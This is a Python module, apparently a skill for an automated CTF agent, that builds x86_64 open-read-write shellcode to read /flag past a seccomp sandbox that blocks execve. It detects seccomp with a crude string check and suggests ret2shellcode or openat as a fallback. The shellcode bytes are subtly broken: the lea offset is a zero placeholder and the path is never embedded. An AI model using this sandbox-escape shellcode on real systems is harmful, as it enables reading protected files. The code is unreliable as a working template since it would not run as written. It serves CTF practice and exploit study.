"""pwn_sandbox_escape skill：seccomp 沙盒逃逸范式。

场景：正式赛 pwn 可能升级为「全保护 + seccomp 沙盒」——需要 ORW（open-read-write）
shellcode 而非直接 execve("/bin/sh")。

流程：① 检测 seccomp 规则（若提供）② 判断是否禁 execve ③ 构造 ORW shellcode。

用法：
    params = {'binary': ELF 路径, 'syscalls_blocked': [59] 或留空}
    result = pwn_sandbox_escape(params)
"""

import os
import re


# x86_64 syscall 号
_SYSCALLS = {
    "open": 2, "read": 0, "write": 1, "execve": 59, "openat": 257,
    "mmap": 9, "mprotect": 10, "sendfile": 40,
}


def _detect_seccomp_from_binary(path: str) -> list:
    """从 ELF 中搜索 seccomp 规则（BPF 字节模式，粗略检测 execve 是否被禁）。"""
    if not os.path.exists(path):
        return []
    data = open(path, "rb").read()
    blocked = []
    # seccomp BPF 常见模式：ret KILL（0x00000000）附近有 syscall 号比较
    # 简化检测：搜索 'execve' 相关字符串或 BPF load 指令（0x20 0x00 0x00 0x00）
    if b"seccomp" in data.lower() or b"SECCOMP" in data:
        blocked.append("seccomp_detected")
    return blocked


def _orw_shellcode(path: str = "/flag") -> bytes:
    """构造 x86_64 ORW shellcode：open(path) → read(fd, buf, 0x100) → write(1, buf, n)。"""
    # 手动构造（经典模板）
    sc = (
        # open("/flag", O_RDONLY, 0)
        b"\x48\x8d\x3d" + _push_path(path) +  # lea rdi, [rip+..]
        b"\x31\xf6" +          # xor esi, esi
        b"\x31\xd2" +          # xor edx, edx
        b"\xb8\x02\x00\x00\x00" +  # mov eax, 2 (open)
        b"\x0f\x05" +          # syscall
        # read(fd, rsp, 0x100)
        b"\x48\x89\xc7" +      # mov rdi, rax (fd)
        b"\x48\x89\xe6" +      # mov rsi, rsp
        b"\xba\x00\x01\x00\x00" +  # mov edx, 0x100
        b"\xb8\x00\x00\x00\x00" +  # mov eax, 0 (read)
        b"\x0f\x05" +          # syscall
        # write(1, rsp, rax)
        b"\x48\x89\xc2" +      # mov rdx, rax (n)
        b"\xbf\x01\x00\x00\x00" +  # mov edi, 1
        b"\x48\x89\xe6" +      # mov rsi, rsp
        b"\xb8\x01\x00\x00\x00" +  # mov eax, 1 (write)
        b"\x0f\x05" +          # syscall
        # exit(0)
        b"\x31\xff" + b"\xb8\x3c\x00\x00\x00" + b"\x0f\x05"
    )
    return sc


def _push_path(path: str) -> bytes:
    """把路径字符串 push 到栈上并返回 lea 需要的偏移（简化：直接内嵌字符串 + ret 前跳）。"""
    # 简化实现：返回路径的 8 字节对齐内嵌（实际用 lea 相对寻址需计算偏移）
    # 这里返回占位（由调用方按实际布局修正）
    return b"\x00" * 4  # placeholder：实际构造时用 pwntools asm 或手工对齐


def pwn_sandbox_escape(params: dict) -> dict:
    """skill 入口：判断沙盒情况，给出逃逸方案。"""
    binary = params.get("binary", "")
    blocked = params.get("syscalls_blocked", [])

    hints = _detect_seccomp_from_binary(binary) if binary else []
    execve_blocked = 59 in blocked or any("execve" in h for h in hints)

    suggestion = []
    if execve_blocked:
        suggestion.append(
            "execve 被禁 → 用 ORW shellcode（open/read/write 读 /flag），"
            "openat(257) 常被遗漏可作备用；构造后 ret2shellcode 或劫持到可控内存执行"
        )
    else:
        suggestion.append(
            "seccomp 未禁 execve → 常规 getshell（system('/bin/sh'）即可；"
            "若禁了则退回 ORW"
        )

    return {
        "ok": True,
        "seccomp_hints": hints,
        "execve_blocked": execve_blocked,
        "syscall_map": _SYSCALLS,
        "suggestion": suggestion,
        "orw_template_note": "ORW shellcode 需按实际路径/布局用 pwntools asm 生成（本 skill 提供流程范式）",
    }


def run(params):
    """SkillManager 统一入口：转发到业务函数。"""
    return pwn_sandbox_escape(params)


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="pwn 沙盒逃逸分析")
    parser.add_argument("--binary", default="", help="ELF 路径")
    args = parser.parse_args()
    import json

    print(json.dumps(pwn_sandbox_escape({"binary": args.binary}), ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
